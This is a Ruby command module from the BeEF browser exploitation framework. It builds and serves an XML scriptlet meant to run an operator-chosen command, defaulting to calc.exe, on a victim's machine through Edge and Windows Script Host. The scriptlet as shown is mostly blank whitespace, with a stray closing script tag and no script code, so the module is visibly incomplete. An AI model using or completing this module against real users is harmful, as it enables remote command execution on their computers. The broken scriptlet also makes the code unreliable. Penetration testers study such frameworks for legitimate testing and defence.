#
# Copyright (c) 2006-2022 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Edge_wscript_wsh_injection < BeEF::Core::Command
  def pre_send
    payload = ''
    @datastore.each do |input|
      payload = input['value'] if input['name'] == 'payload'
    end

    rand_str = rand(32**10).to_s(32)

    script = <<~EOF
      <?XML version="1.0"?>#{'                                                                                           '}
        <scriptlet>

                                                                                                                                                                                                                                                                                                                                                                                                                 
        </script>

        </scriptlet>
    EOF

    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind_raw('200',
                                                                       {
                                                                         'Content-Type' => 'text/html'
                                                                       },
                                                                       script,
                                                                       "/#{@command_id}/index.html",
                                                                       -1)
  end

  def self.options
    [
      { 'name' => 'payload', 'ui_label' => 'Commands', 'value' => 'calc.exe' }
    ]
  end

  def post_execute
    save({ 'result' => @datastore['result'] })
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind("/#{@command_id}/index.html")
  end
end
